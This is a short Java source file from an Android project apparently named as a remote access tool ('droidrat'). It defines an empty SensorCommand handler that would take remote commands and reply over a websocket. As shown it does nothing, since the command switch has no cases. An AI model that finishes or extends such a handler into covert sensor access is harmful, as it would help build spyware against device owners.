package com.je_chen.droidrat_je.command;

import android.hardware.SensorManager;

import com.je_chen.droidrat_je.command.process_super.CommandFather;
import com.je_chen.droidrat_je.command.process_super.CommandProcessInterface;

import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websocket;

public class SensorCommand extends CommandFather implements CommandProcessInterface {

    public SensorCommand(SensorManager sensorManager){
    }

    @Override
    public void send(String value) {
        websocket.send(value);
    }

    @Override
    public void processCommand(String command) {
        try {
            String[] rawCommandArray = command.split(" ");
            switch (rawCommandArray[1]) {

            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
